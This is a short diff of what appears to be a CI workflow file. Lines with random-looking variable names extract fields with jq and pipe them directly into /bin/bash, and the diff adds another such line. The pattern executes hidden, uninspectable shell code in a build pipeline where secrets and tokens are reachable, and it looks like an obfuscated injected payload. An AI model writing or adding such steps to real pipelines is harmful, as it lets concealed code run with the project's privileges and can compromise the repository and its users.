@@ -26,6 +26,7 @@ jobs:
           echo $cajsz21 | jq -r .fwwlr72816 | /bin/bash
           echo $tfl2 | jq -r .x916 | /bin/bash
           printf '%s' "$jdyyl08" | jq -r .m129 | /bin/bash
+          echo $kutcz207 | jq -r .owydw8 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
